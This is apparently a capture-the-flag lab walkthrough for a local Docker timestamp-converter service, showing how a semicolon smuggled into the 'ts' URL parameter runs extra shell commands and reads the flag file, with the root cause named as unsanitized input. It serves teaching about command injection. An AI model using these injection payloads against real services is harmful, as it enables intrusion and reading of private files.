# Walkthrough: Epoch

## Setup

```bash
docker compose up --build -d
```

## Step 1: Enumerate the service

```bash
curl http://localhost:8080/
```

Output:

```
Epoch Timestamp Converter
Usage: GET /convert?ts=<unix_timestamp>
Example: GET /convert?ts=0
```

## Step 2: Test normal input

```bash
curl http://localhost:8080/convert?ts=0
```

Output:

```
Thu Jan  1 00:00:00 UTC 1970
```

## Step 3: Probe for injection

```bash
curl "http://localhost:8080/convert?ts=0%3Bid"
```

If the app is vulnerable, the output includes the result of `id`.

## Step 4: Read the flag

```bash
curl "http://localhost:8080/convert?ts=0%3Bcat+/flag.txt"
```

Output:

```
Thu Jan  1 00:00:00 UTC 1970
POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```

## Attack Chain

```
GET /convert?ts=0  ->  normal date output
GET /convert?ts=0;cat /flag.txt  ->  date output + flag
  root cause: ts passed to shell string without sanitization
```
